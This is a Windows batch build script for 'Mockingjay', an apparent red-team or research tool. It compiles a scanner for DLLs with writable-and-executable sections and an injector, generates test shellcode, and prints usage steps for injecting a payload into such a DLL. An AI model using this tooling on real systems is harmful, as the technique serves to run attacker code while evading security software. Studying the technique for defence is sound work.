@echo off
REM ========================================
REM Mockingjay - Windows Build Script
REM ========================================

echo ========================================
echo Building Mockingjay Process Injection
echo ========================================
echo.

REM 创建输出目录
if not exist "build" mkdir build

REM [1] 编译 RWX Finder
echo [1/3] Compiling RWX Finder...
gcc -O2 -o build\rwx_finder.exe src\rwx_finder.c -ldbghelp
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to compile rwx_finder.exe
    exit /b 1
)
echo [+] rwx_finder.exe compiled successfully
echo.

REM [2] 编译 Mockingjay 主程序
echo [2/3] Compiling Mockingjay injector...
gcc -O2 -o build\mockingjay.exe src\mockingjay.c -ldbghelp -lpsapi
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to compile mockingjay.exe
    exit /b 1
)
echo [+] mockingjay.exe compiled successfully
echo.

REM [3] 生成测试 shellcode（可选）
echo [3/3] Generating test shellcode...
if exist ..\common\generate_shellcode.c (
    gcc -o build\generate_shellcode.exe ..\common\generate_shellcode.c
    if %ERRORLEVEL% equ 0 (
        build\generate_shellcode.exe build\payload.bin
        echo [+] Test shellcode generated: build\payload.bin
    )
) else (
    echo [i] Shellcode generator not found, skipping...
)
echo.

echo ========================================
echo Build Complete!
echo ========================================
echo.
echo Output files:
echo   - build\rwx_finder.exe     (RWX section scanner)
echo   - build\mockingjay.exe     (Mockingjay injector)
if exist build\payload.bin (
    echo   - build\payload.bin        (Test shellcode)
)
echo.
echo Usage:
echo   REM Step 1: Find DLLs with RWX sections
echo   build\rwx_finder.exe "C:\Windows\System32"
echo.
echo   REM Step 2: Inject shellcode into RWX section
echo   build\mockingjay.exe "C:\path\to\vulnerable.dll" build\payload.bin
echo.
echo Note:
echo   - Some DLLs may contain RWX sections (e.g., msys-2.0.dll)
echo   - Use rwx_finder.exe to scan your system
echo.
